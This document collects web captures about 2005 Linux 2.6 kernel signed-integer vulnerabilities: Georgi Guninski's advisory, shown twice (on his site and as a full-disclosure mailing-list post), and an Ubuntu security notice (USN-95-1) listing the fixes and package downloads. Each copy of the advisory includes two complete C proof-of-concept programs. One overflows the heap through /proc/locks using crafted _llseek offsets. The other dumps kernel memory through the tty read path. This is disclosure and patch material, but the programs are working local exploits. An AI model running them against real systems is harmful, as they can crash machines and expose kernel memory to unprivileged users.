=== Content from www.guninski.com_138c08f2_20250125_203456.html ===

[Home](index.html)

**Security**

[Internet Explorer](browsers.html)

[Windows 2000](win2k.html)

[AIX](exploit.html)

[Netscape](netscape.html)

[Misc](misc.html)

**Other**

[Services](me.html)

[Links](greets.html)

[Mailing list](mailinglist.html)

[Random stuff](rand/index.html)

**Contact**

guninski@guninski.com

[gpg/pgp key](guninski.pub.asc)
## linux kernel 2.6 fun. windoze is a joke

Georgi Guninski security advisory #73, 2004

linux kernel 2.6 fun. windoze is a joke

Systems affected:

linux kernel 2.6.10, probably earlier 2.6.

2.4 not tested

Date: 15 February 2005

Legal Notice:

This Advisory is Copyright (c) 2004 Georgi Guninski.

You  may  not  modify
it   and   distribute
it   or   distribute   parts

of it without the author's written permission - this
especially  applies  to

so called "vulnerabilities databases"  and
securityfocus,  microsoft,    cert

and mitre.

If   you   want
to     link
 to    this
content      use
 the    URL:

http://www.guninski.com/where\_do\_you\_want\_billg\_to\_go\_today\_3.html

Anything in this document may change without notice.

Disclaimer:

The  information  in  this  advisory
is  believed   to   be
true   though

it may be false.

The opinions  expressed  in  this
advisory  and  program  are
my  own  and

not   of   any
 company.    The   usual
standard   disclaimer    applies,

especially the fact that Georgi Guninski  is  not
liable  for    any  damages

caused by direct  or  indirect
use  of  the  information  or
functionality

provided  by  this  advisory  or
program.    Georgi   Guninski
bears   no

responsibility for  content  or  misuse
of  this  advisory  or  program  or

any derivatives thereof.

Description:

There is misuse of signed types in 2.6, leading to buffer overflow
and

reading kernel memory.

Details:

WDYBTGT3-1:

there is heap overflow in /proc in at least 2.6.10 and
2.6.11rc1-bk6 (

have not tested 2.4) on i386.

it is combination of:

1.

`fs/proc/generic.c:63

proc_file_read(struct file *file, char __user *buf, size_t
nbytes,

loff_t *ppos)

        while ((nbytes > 0)
&& !eof) {

count = min_t(ssize_t, PROC_BLOCK_SIZE, nbytes);`

(ssize\_t) cast is the bug.

2.

proc\_misc:

`static int locks_read_proc(char *page, char **start, off_t
off,

int count, int *eof, void *data)

{`

the problem is "off\_t off" which on i386 is long, while llseek uses
loff\_t

which is "long long".

so it is possible to land in locks\_read\_proc with both "count" and
"off"

negative longs but with positive sum, which leads to
overflow.

WDYBTGT3-2:

it is possible to read kernel memory on at least 2.6.10 and
2.6.11rc1 on

i386.

the problem is in drivers/char/n\_tty.c

-----------------------

s`tatic inline int copy_from_read_buf(struct tty_struct
*tty,

unsigned char __user **b,

size_t *nr)

ssize_t n;

n = min((ssize_t)*nr, n);

        ^^^^^^^^^

spin_unlock_irqrestore(&tty->read_lock, flags);

if (n) {

       mb();

        retval =
copy_to_user(*b, &tty->read_buf[tty->read_tail],
n);

^^^`

WDYBTGT3-3:

have not been verified on real iron, but this codepath is
suspicous:

`net/atm/resources.c

int atm_dev_ioctl(unsigned int cmd, void __user *arg)

{

        if (get_user(len,
&sioc->length))

return -EFAULT;

        case ATM_GETADDR:

error = atm_get_addr(dev, buf, len);

if (error < 0)

net/atm/addr.c

int atm_get_addr(struct atm_dev *dev,struct sockaddr_atmsvc __user
*buf,int

size)

{

        unsigned long
flags;

        struct atm_dev_addr
*walk;

        int total = 0,
error;

      if (copy_to_user(buf, tmp_buf, total
< size ? total : size))

^^^^^^^^^^^^^^^^^^^^^^^^^^^^^`

WDYBTGT3-4:

have not been verified on real iron, but this codepath is
suspicous:

fs/reiserfs/file.c:622

int reiserfs\_copy\_from\_user\_to\_file\_region(

...

int count = min\_t(int,PAGE\_CACHE\_SIZE-offset,write\_bytes);

page\_fault = \_\_copy\_from\_user(page\_address(page)+offset, buf,
count);

[dangerous only if sizeof(size\_t) > sizeof(int) ]

WDYBTGT3-5:

Fix:

2.6.11-rc4 availabe at http://www.kernel.org/ fixes the "anomalies"
and in

addition adds some checks at the vfs layer and
copy\_from\_user.

Individual patches:

[http://linux.bkbits.net:8080/linux-2.6/cset@4201818eC6aMn0x3GY\_9rw3ueb2ZWQ?nav=index.html|ChangeSet@-4w](http://linux.bkbits.net:8080/linux-2.6/cset%404201818eC6aMn0x3GY_9rw3ueb2ZWQ?nav=index.html%7CChangeSet@-4w)

[http://linux.bkbits.net:8080/linux-2.6/cset@420181322LZmhPTewcCOLkubGwOL3w?nav=index.html|ChangeSet@-4w](http://linux.bkbits.net:8080/linux-2.6/cset%40420181322LZmhPTewcCOLkubGwOL3w?nav=index.html%7CChangeSet@-4w)

[http://linux.bkbits.net:8080/linux-2.6/cset@4208e1fcfccuD-eH2OGM5mBhihmQ3A?nav=index.html|ChangeSet@-4w](http://linux.bkbits.net:8080/linux-2.6/cset%404208e1fcfccuD-eH2OGM5mBhihmQ3A?nav=index.html%7CChangeSet@-4w)

[http://linux.bkbits.net:8080/linux-2.6/cset@42018227TkNpHlX6BefnItV\_GqMmzQ?nav=index.html|ChangeSet@-4w](http://linux.bkbits.net:8080/linux-2.6/cset%4042018227TkNpHlX6BefnItV_GqMmzQ?nav=index.html%7CChangeSet@-4w)

proggies:

/\*

\* copyright georgi guninski

\* cannot be used in vulnerability databases
like securityfocus and mitre

\*

\* \*/

#include <stdio.h>

#include <stdlib.h>

#include <sys/types.h>

#include <sys/stat.h>

#include <fcntl.h>

#include <unistd.h>

#include <string.h>

#include <sys/mman.h>

#include <sys/file.h>

#include <syscall.h>

#include <errno.h>

\_syscall5(**int**, \_llseek, uint,
fd, ulong, hi, ulong, lo, loff\_t \*, res,

uint, wh)

**void** makefiles()

{

**int** cou,fv;

**char** vn[242];

**for**(cou=0;cou<920;cou++)

{

snprintf(vn,**sizeof**(vn),"TEMPFILEMAYBEDELETE%d.%d",getpid(),cou);

fv=open(vn,O\_CREAT|O\_RDWR,S\_IRWXU);

**if** (fv <0) perror("open2");

**if** (flock(fv,LOCK\_EX) ==
-1) perror("flock");

}

**while**(42);

}

**int** main(**int** ac, **char** \*\*av)

{

**int** fd,fv,i,cou;

**void** \*mv;

**char** \*he,\*he2;

loff\_t lr;

**char** c;

printf("\n\nThis may seriously screw
your box\n\n");

printf("This creates a lot of files
'TEMPFILEMAYBEDELE\*' in cwd\n");

printf("Press 'Y' to run
it\n");

read(0,&c,1);

**if** (c != 'Y') **return**
42;

cou=5;

printf("creating files...\n");

**while**(cou--)

**if** (!fork())

makefiles();

sleep(20);

printf("starting...\n");

system("sync");

fd=open("/proc/locks",O\_RDONLY);

**if** (fd <0) perror("open");

he=malloc(1024\*1024\*8);

he2=malloc(1024\*1024\*8);

**if** (-1 == \_llseek(fd,42,0x80004242,&lr,SEEK\_SET)) perror("llseek");

i=read(fd,he2, 0x80004242);

perror("read");

printf("read=%d mv=%x fv=%x\n %.300s",i,(**int**)mv,fv,he2);

**while**(42);

**return** 42;

}

================================================================

/\*

\* Copyright Georgi Guninski

\* Cannot be used in vulnerability databases
like security focus and mitre

\* \*/

#include <stdio.h>

#include <stdlib.h>

#include <sys/types.h>

#include <sys/stat.h>

#include <fcntl.h>

#include <linux/vt.h>

#include <sys/vt.h>

#include <sys/ioctl.h>

#include <string.h>

#include <unistd.h>

#include <term.h>

#include <sys/mman.h>

**int** main(**int** ac, **char** \*\*av)

{

**int** fd,fv;

**int** cou=4242,i;

**char** \*bu;

**struct** termios ti;

**struct** termios ol;

**char** zer[1024];

fd=open("/dev/tty",O\_RDWR);

**if** (fd<0) {perror("open");**return**
-42;}

memset(&ti,0,**sizeof**(ti));

fv=open("kmem1",O\_CREAT|O\_RDWR|O\_TRUNC,S\_IRWXU);

**if** (fv <0 ) perror("open2");

/\* how much to
read in kilobytes\*/

i=40\*1024;

memset(zer,0,**sizeof**(zer));

**while**(i--)
write(fv,zer,**sizeof**(zer));

bu=mmap(0,0x80000000,PROT\_READ|PROT\_WRITE,MAP\_SHARED,fv,
0);

**if** (-1 == (**long**)
bu) perror("mmap");

printf("bu=%x\n",(**int**)bu);

**if** (ioctl(fd,TCGETS,&ti)
< 0) perror("TCGETS");

ol=ti;

ti.c\_lflag &= (~ICANON & ~ISIG & ~ICRNL & ~IXON
& ~OPOST );

**if** (ioctl(fd,TCSETS,&ti)
< 0) perror("TCSETS");

**if** (!fork())

{sleep(3);ioctl(fd,TIOCSTI,&cou);exit(0);};

sleep(2);

cou=read(fd,bu,0x80000000);

printf("read=%d\n",cou);

perror("read");

**if** (ioctl(fd,TCSETS,&ol)
< 0) perror("TCSETS");

printf("done. check 'kmem1'");

system("reset");

**return** 42;

}

--

And did you exchange a walk on part in the war for a lead role in a
cage?



=== Content from marc.info_be2445eb_20250125_203455.html ===

```
[[prev in list](?l=full-disclosure&m=110846509702529&w=2)] [[next in list](?l=full-disclosure&m=110852060015190&w=2)] [prev in thread] [next in thread]
List:       [full-disclosure](?l=full-disclosure&r=1&w=2)
Subject:    [Full-Disclosure] linux kernel 2.6 fun. windoze is a joke
From:       [Georgi Guninski <guninski () guninski ! com>](?a=96929514600006&r=1&w=2)
Date:       [2005-02-15 11:15:27](?l=full-disclosure&r=1&w=2&b=200502)
Message-ID: [20050215111527.GD4948 () sivokote ! iziade ! m$](?i=20050215111527.GD4948%20()%20sivokote%20!%20iziade%20!%20m$)
[Download RAW [message](?l=full-disclosure&m=110846727602817&q=mbox) or [body](?l=full-disclosure&m=110846727602817&q=raw)]

Georgi Guninski security advisory #73, 2004

linux kernel 2.6 fun. windoze is a joke

Systems affected:
linux kernel 2.6.10, probably earlier 2.6.
2.4 not tested

Date: 15 February 2005

Legal Notice:
This Advisory is Copyright (c) 2004 Georgi Guninski.
You  may  not  modify	it   and   distribute	it   or   distribute   parts
of it without the author's written permission - this especially  applies  to
so called "vulnerabilities databases"  and  securityfocus,  microsoft,	cert
and mitre.
If   you   want    to	 link	 to    this    content	  use	 the	URL:
<http://www.guninski.com/where_do_you_want_billg_to_go_today_3.html>
Anything in this document may change without notice.

Disclaimer:
The  information  in  this  advisory  is  believed   to   be   true   though
it may be false.
The opinions  expressed  in  this  advisory  and  program  are	my  own  and
not   of   any	 company.    The   usual   standard   disclaimer    applies,
especially the fact that Georgi Guninski  is  not  liable  for	any  damages
caused by direct  or  indirect	use  of  the  information  or  functionality
provided  by  this  advisory  or  program.    Georgi   Guninski   bears   no
responsibility for  content  or  misuse  of  this  advisory  or  program  or
any derivatives thereof.

Description:

There is misuse of signed types in 2.6, leading to buffer overflow and
reading kernel memory.

Details:

WDYBTGT3-1:

there is heap overflow in /proc in at least 2.6.10 and 2.6.11rc1-bk6 (
have not tested 2.4) on i386.

it is combination of:

1.
fs/proc/generic.c:63
proc_file_read(struct file *file, char __user *buf, size_t nbytes,
               loff_t *ppos)
        while ((nbytes > 0) && !eof) {
                count = min_t(ssize_t, PROC_BLOCK_SIZE, nbytes);

(ssize_t) cast is the bug.

2.
proc_misc:
static int locks_read_proc(char *page, char **start, off_t off,
                                 int count, int *eof, void *data)
{

the problem is "off_t off" which on i386 is long, while llseek uses loff_t
which is "long long".

so it is possible to land in locks_read_proc with both "count" and "off"
negative longs but with positive sum, which leads to overflow.

WDYBTGT3-2:

it is possible to read kernel memory on at least 2.6.10 and 2.6.11rc1 on
i386.

the problem is in drivers/char/n_tty.c

-----------------------
static inline int copy_from_read_buf(struct tty_struct *tty,
                                      unsigned char __user **b,
                                      size_t *nr)
ssize_t n;

n = min((ssize_t)*nr, n);
        ^^^^^^^^^
spin_unlock_irqrestore(&tty->read_lock, flags);
if (n) {
       mb();
        retval = copy_to_user(*b, &tty->read_buf[tty->read_tail], n);
                                                                 ^^^

WDYBTGT3-3:

have not been verified on real iron, but this codepath is suspicous:

net/atm/resources.c
int atm_dev_ioctl(unsigned int cmd, void __user *arg)
{
        if (get_user(len, &sioc->length))
                return -EFAULT;

        case ATM_GETADDR:
                        error = atm_get_addr(dev, buf, len);
                        if (error < 0)

net/atm/addr.c
int atm_get_addr(struct atm_dev *dev,struct sockaddr_atmsvc __user *buf,int
size)
{
        unsigned long flags;
        struct atm_dev_addr *walk;
        int total = 0, error;
      if (copy_to_user(buf, tmp_buf, total < size ? total : size))
                                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

WDYBTGT3-4:
have not been verified on real iron, but this codepath is suspicous:

fs/reiserfs/file.c:622
int reiserfs_copy_from_user_to_file_region(
...
int count = min_t(int,PAGE_CACHE_SIZE-offset,write_bytes);
page_fault = __copy_from_user(page_address(page)+offset, buf, count);

[dangerous only if sizeof(size_t) > sizeof(int) ]

WDYBTGT3-5:

Fix:

2.6.11-rc4 availabe at <http://www.kernel.org/> fixes the "anomalies" and in
addition adds some checks at the vfs layer and copy_from_user.

Individual patches:

[http://linux.bkbits.net:8080/linux-2.6/cset@4201818eC6aMn0x3GY_9rw3ueb2ZWQ?nav=index.html|ChangeSet@-4w](http://linux.bkbits.net:8080/linux-2.6/cset%404201818eC6aMn0x3GY_9rw3ueb2ZWQ?nav=index.html|ChangeSet@-4w)
[http://linux.bkbits.net:8080/linux-2.6/cset@420181322LZmhPTewcCOLkubGwOL3w?nav=index.html|ChangeSet@-4w](http://linux.bkbits.net:8080/linux-2.6/cset%40420181322LZmhPTewcCOLkubGwOL3w?nav=index.html|ChangeSet@-4w)
[http://linux.bkbits.net:8080/linux-2.6/cset@4208e1fcfccuD-eH2OGM5mBhihmQ3A?nav=index.html|ChangeSet@-4w](http://linux.bkbits.net:8080/linux-2.6/cset%404208e1fcfccuD-eH2OGM5mBhihmQ3A?nav=index.html|ChangeSet@-4w)
[http://linux.bkbits.net:8080/linux-2.6/cset@42018227TkNpHlX6BefnItV_GqMmzQ?nav=index.html|ChangeSet@-4w](http://linux.bkbits.net:8080/linux-2.6/cset%4042018227TkNpHlX6BefnItV_GqMmzQ?nav=index.html|ChangeSet@-4w)

proggies:

/*
 * copyright georgi guninski
 * cannot be used in vulnerability databases like securityfocus and mitre
 *
 * */
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/file.h>
#include <syscall.h>
#include <errno.h>

_syscall5(int,  _llseek, uint, fd, ulong, hi, ulong, lo, loff_t *, res,
       uint, wh)

void makefiles()
{
	int cou,fv;
	char vn[242];
	for(cou=0;cou<920;cou++)
	{
		snprintf(vn,sizeof(vn),"TEMPFILEMAYBEDELETE%d.%d",getpid(),cou);
		fv=open(vn,O_CREAT|O_RDWR,S_IRWXU);
		if (fv <0) perror("open2");
		if (flock(fv,LOCK_EX) == -1) perror("flock");

	}
	while(42);
}

int main(int ac, char **av)
{
	int fd,fv,i,cou;
	void *mv;
	char *he,*he2;
	loff_t lr;
	char c;

	printf("\n\nThis may seriously screw your box\n\n");
	printf("This creates a lot of files 'TEMPFILEMAYBEDELE*' in cwd\n");
	printf("Press 'Y' to run it\n");
	read(0,&c,1);
	if (c != 'Y') return 42;
	cou=5;
	printf("creating files...\n");
	while(cou--)
		if (!fork())
			makefiles();

	sleep(20);
	printf("starting...\n");
	system("sync");
	fd=open("/proc/locks",O_RDONLY);
	if (fd <0) perror("open");
	he=malloc(1024*1024*8);
	he2=malloc(1024*1024*8);

	if (-1 == _llseek(fd,42,0x80004242,&lr,SEEK_SET)) perror("llseek");
	i=read(fd,he2, 0x80004242);
	perror("read");
	printf("read=%d mv=%x fv=%x\n %.300s",i,(int)mv,fv,he2);
	while(42);
	return 42;
}

================================================

/*
 * Copyright Georgi Guninski
 * Cannot be used in vulnerability databases like security focus and mitre
 * */
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <linux/vt.h>
#include <sys/vt.h>
#include <sys/ioctl.h>
#include <string.h>
#include <unistd.h>
#include <term.h>
#include <sys/mman.h>

int main(int ac, char **av)
{
int fd,fv;
int cou=4242,i;
char *bu;
struct termios ti;
struct termios ol;
char zer[1024];

fd=open("/dev/tty",O_RDWR);
if (fd<0) {perror("open");return -42;}
memset(&ti,0,sizeof(ti));
fv=open("kmem1",O_CREAT|O_RDWR|O_TRUNC,S_IRWXU);
if (fv <0 ) perror("open2");

/* how much to read in kilobytes*/
i=40*1024;

memset(zer,0,sizeof(zer));
while(i--) write(fv,zer,sizeof(zer));

bu=mmap(0,0x80000000,PROT_READ|PROT_WRITE,MAP_SHARED,fv,0);
if (-1 == (long) bu) perror("mmap");
printf("bu=%x\n",(int)bu);
if (ioctl(fd,TCGETS,&ti) < 0) perror("TCGETS");
ol=ti;
ti.c_lflag &= (~ICANON & ~ISIG & ~ICRNL & ~IXON & ~OPOST );
if (ioctl(fd,TCSETS,&ti) < 0) perror("TCSETS");
if (!fork())
	{sleep(3);ioctl(fd,TIOCSTI,&cou);exit(0);};
sleep(2);
cou=read(fd,bu,0x80000000);
printf("read=%d\n",cou);
perror("read");

if (ioctl(fd,TCSETS,&ol) < 0) perror("TCSETS");
printf("done. check 'kmem1'");
system("reset");
return 42;
}

--
And did you exchange a walk on part in the war for a lead role in a cage?
 // pink floyd
_______________________________________________
Full-Disclosure - We believe in it.
Charter: <http://lists.netsys.com/full-disclosure-charter.html>
[[prev in list](?l=full-disclosure&m=110846509702529&w=2)] [[next in list](?l=full-disclosure&m=110852060015190&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from marc.info_0b531f4f_20250125_203455.html ===

```
[[prev in list](?l=bugtraq&m=111091295805192&w=2)] [[next in list](?l=bugtraq&m=111091349210976&w=2)] [[prev in thread](?l=ubuntu-security-announce&m=139113797221668&w=2)] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    [[USN-95-1] Linux kernel vulnerabilities](?t=111091403300003&r=1&w=2)
From:       [Martin Pitt <martin.pitt () canonical ! com>](?a=109531671800003&r=1&w=2)
Date:       [2005-03-15 14:12:28](?l=bugtraq&r=1&w=2&b=200503)
Message-ID: [20050315141228.GA26207 () box79162 ! elkhouse ! de](?i=20050315141228.GA26207%20()%20box79162%20!%20elkhouse%20!%20de)
[Download RAW [message](?l=bugtraq&m=111091402626556&q=mbox) or [body](?l=bugtraq&m=111091402626556&q=raw)]

===========================================================
Ubuntu Security Notice USN-95-1		     March 15, 2005
linux-source-2.6.8.1 vulnerabilities
CAN-2005-0209, CAN-2005-0210, CAN-2005-0384, CAN-2005-0529,
CAN-2005-0530, CAN-2005-0531, CAN-2005-0532, CAN-2005-0736
===========================================================

A security issue affects the following Ubuntu releases:

Ubuntu 4.10 (Warty Warthog)

The following packages are affected:

linux-image-2.6.8.1-5-386
linux-image-2.6.8.1-5-686
linux-image-2.6.8.1-5-686-smp
linux-image-2.6.8.1-5-amd64-generic
linux-image-2.6.8.1-5-amd64-k8
linux-image-2.6.8.1-5-amd64-k8-smp
linux-image-2.6.8.1-5-amd64-xeon
linux-image-2.6.8.1-5-k7
linux-image-2.6.8.1-5-k7-smp
linux-image-2.6.8.1-5-power3
linux-image-2.6.8.1-5-power3-smp
linux-image-2.6.8.1-5-power4
linux-image-2.6.8.1-5-power4-smp
linux-image-2.6.8.1-5-powerpc
linux-image-2.6.8.1-5-powerpc-smp
linux-patch-debian-2.6.8.1

The problem can be corrected by upgrading the affected package to
version 2.6.8.1-16.12. You need to reboot the computer after doing a
standard system upgrade to effect the necessary changes.

Details follow:

A remote Denial of Service vulnerability was discovered in the
Netfilter IP packet handler. This allowed a remote attacker to crash
the machine by sending specially crafted IP packet fragments.
(CAN-2005-0209)

The Netfilter code also contained a memory leak. Certain locally
generated packet fragments are reassembled twice, which caused a
double allocation of a data structure. This could be locally exploited
to crash the machine due to kernel memory exhaustion. (CAN-2005-0210)

Ben Martel and Stephen Blackheath found a remote Denial of Service
vulnerability in the PPP driver. This allowed a malicious pppd client
to crash the server machine. (CAN-2005-0384)

Georgi Guninski discovered a buffer overflow in the ATM driver. The
atm_get_addr() function does not validate its arguments sufficiently,
which could allow a local attacker to overwrite large portions of
kernel memory by supplying a negative length argument. This could
eventually lead to arbitrary code execution. (CAN-2005-0531)

Georgi Guninski also discovered three other integer comparison
problems in the TTY layer, in the /proc interface and the ReiserFS
driver. However, the previous Ubuntu security update (kernel version
2.6.8.1-16.11) already contained a patch which checks the arguments to
these functions at a higher level and thus prevents these flaws from
being exploited. (CAN-2005-0529, CAN-2005-0530, CAN-2005-0532)

Georgi Guninski discovered an integer overflow in the sys_epoll_wait()
function which allowed local users to overwrite the first few kB of
physical memory. However, very few applications actually use this
space (dosemu is a notable exception), but potentially this could lead
to privilege escalation. (CAN-2005-0736)

Eric Anholt discovered a race condition in the Radeon DRI driver. In
some cases this allowed a local user with DRI privileges on a Radeon
card to execute arbitrary code with root privileges.

Finally this update fixes a regression in the NFS server driver
which was introduced in the previous security update (kernel version
2.6.8.1-16.11). We apologize for the inconvenience.
(<https://bugzilla.ubuntulinux.org/show_bug.cgi?id=6749>)

  Source archives:

    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-source-2.6.8.1_2.6.8.1-16.12.diff.gz>
  Size/MD5:  3138173 562c678c1db3839022a46fe6707b17a2
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-source-2.6.8.1_2.6.8.1-16.12.dsc>
  Size/MD5:     2121 ca9878e5a4300fb3d3ae973528826752
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-source-2.6.8.1_2.6.8.1.orig.tar.gz>
  Size/MD5: 44728688 79730a3ad4773ba65fab65515369df84

  Architecture independent packages:

    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-doc-2.6.8.1_2.6.8.1-16.12_all.deb>
  Size/MD5:  6156398 8c909af9ca59a3ca9332e9b104550345
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-patch-debian-2.6.8.1_2.6.8.1-16.12_all.deb>
  Size/MD5:  1494402 7a0837f2bf959a81c654c739adbd46e9
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-source-2.6.8.1_2.6.8.1-16.12_all.deb>
  Size/MD5: 36720352 05befe6c04d9327f92b49f8141220449
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-tree-2.6.8.1_2.6.8.1-16.12_all.deb>
  Size/MD5:   308034 147891a0041bcf9d210915a71914d6c0

  amd64 architecture (Athlon64, Opteron, EM64T Xeon)

    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-headers-2.6.8.1-5-amd64-generic_2.6.8.1-16.12_amd64.deb>
  Size/MD5:   247896 7dd57b2064006690e2cdcad73ee68d45
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-headers-2.6.8.1-5-amd64-k8-smp_2.6.8.1-16.12_amd64.deb>
  Size/MD5:   243798 af368e29fd8253726f4d98fc61ae8e63
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-headers-2.6.8.1-5-amd64-k8_2.6.8.1-16.12_amd64.deb>
  Size/MD5:   246918 2f15a30e62829856a793e1750d1627ec
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-headers-2.6.8.1-5-amd64-xeon_2.6.8.1-16.12_amd64.deb>
  Size/MD5:   242064 095a0823406b09537441e3e57bc2ab6c
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-headers-2.6.8.1-5_2.6.8.1-16.12_amd64.deb>
  Size/MD5:  3178994 b3837998e2015412d6a23a1767ab1f11
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-image-2.6.8.1-5-amd64-generic_2.6.8.1-16.12_amd64.deb>
  Size/MD5: 14352688 c5be7b5e81a224bbe32c96f8abb4612e
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-image-2.6.8.1-5-amd64-k8-smp_2.6.8.1-16.12_amd64.deb>
  Size/MD5: 14828788 eb195f0cf157bfe5da0dc5b77b156c27
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-image-2.6.8.1-5-amd64-k8_2.6.8.1-16.12_amd64.deb>
  Size/MD5: 14861436 b43ddb164a0a2cc8808d1262b8d5750d
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-image-2.6.8.1-5-amd64-xeon_2.6.8.1-16.12_amd64.deb>
  Size/MD5: 14684670 3420b9272177aece4bde1a566e894cf2

  i386 architecture (x86 compatible Intel/AMD)

    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-headers-2.6.8.1-5-386_2.6.8.1-16.12_i386.deb>
  Size/MD5:   276950 3d9f318befd4cabacf059a85c06324c0
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-headers-2.6.8.1-5-686-smp_2.6.8.1-16.12_i386.deb>
  Size/MD5:   271656 09e1b2b404a079852f81b4d7b6eae7bb
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-headers-2.6.8.1-5-686_2.6.8.1-16.12_i386.deb>
  Size/MD5:   274682 9f5ae2ee5d09e85f799eaf4ea3770615
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-headers-2.6.8.1-5-k7-smp_2.6.8.1-16.12_i386.deb>
  Size/MD5:   272144 67499c9bafe38440ee8f3f2b09b667e8
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-headers-2.6.8.1-5-k7_2.6.8.1-16.12_i386.deb>
  Size/MD5:   274840 754e3a4030ee75d3362466832849acbd
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-headers-2.6.8.1-5_2.6.8.1-16.12_i386.deb>
  Size/MD5:  3219706 508896938223113ea1699aa4151b8766
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-image-2.6.8.1-5-386_2.6.8.1-16.12_i386.deb>
  Size/MD5: 15495248 38b990d93eaba078db891bd7404c01e7
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-image-2.6.8.1-5-686-smp_2.6.8.1-16.12_i386.deb>
  Size/MD5: 16344242 89cb33e659438f4e34b68ba3c32106cd
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-image-2.6.8.1-5-686_2.6.8.1-16.12_i386.deb>
  Size/MD5: 16512992 4147111c66724fa8691e4b16c356ce86
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-image-2.6.8.1-5-k7-smp_2.6.8.1-16.12_i386.deb>
  Size/MD5: 16447442 663241c045b232b8b46ff9c5d5b2f973
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-image-2.6.8.1-5-k7_2.6.8.1-16.12_i386.deb>
  Size/MD5: 16572538 8b8891f4526497e43eab0c173f179615

  powerpc architecture (Apple Macintosh G3/G4/G5)

    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-headers-2.6.8.1-5-power3-smp_2.6.8.1-16.12_powerpc.deb>
  Size/MD5:   212792 cb39e28e0814976f2831528e20bf8deb
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-headers-2.6.8.1-5-power3_2.6.8.1-16.12_powerpc.deb>
  Size/MD5:   213482 5b469307ceb0839a5ca73e170bd4b5a9
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-headers-2.6.8.1-5-power4-smp_2.6.8.1-16.12_powerpc.deb>
  Size/MD5:   212514 eec8a75e60edee4eb0784cc44b4c5991
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-headers-2.6.8.1-5-power4_2.6.8.1-16.12_powerpc.deb>
  Size/MD5:   213232 7dc2c5a6884dc3bb9e12cb15c2d86475
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-headers-2.6.8.1-5-powerpc-smp_2.6.8.1-16.12_powerpc.deb>
  Size/MD5:   213112 71c2be933fe1cae5cf04a834af834b97
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-headers-2.6.8.1-5-powerpc_2.6.8.1-16.12_powerpc.deb>
  Size/MD5:   214548 72904d0d50787c36b097c11f480329ba
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-headers-2.6.8.1-5_2.6.8.1-16.12_powerpc.deb>
  Size/MD5:  3297040 15f7b67ca420635504ba90d020cd5990
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-image-2.6.8.1-5-power3-smp_2.6.8.1-16.12_powerpc.deb>
  Size/MD5: 16366562 437904d293401104d04e879394be098e
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-image-2.6.8.1-5-power3_2.6.8.1-16.12_powerpc.deb>
  Size/MD5: 15942190 1b71783b31ec56e29d09dfa8de844caa
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-image-2.6.8.1-5-power4-smp_2.6.8.1-16.12_powerpc.deb>
  Size/MD5: 16353764 8aefa48d5f7461db9ede5fd05da3c57a
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-image-2.6.8.1-5-power4_2.6.8.1-16.12_powerpc.deb>
  Size/MD5: 15924916 14f880d34cd8f1e232ec52a559f046af
    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-image-2.6.8.1-5-powerpc-smp_2.6.8.1-16.12_powerpc.deb>
  Size/MD5: 16289024 1878256aaff9b8bbb003554590d359b3
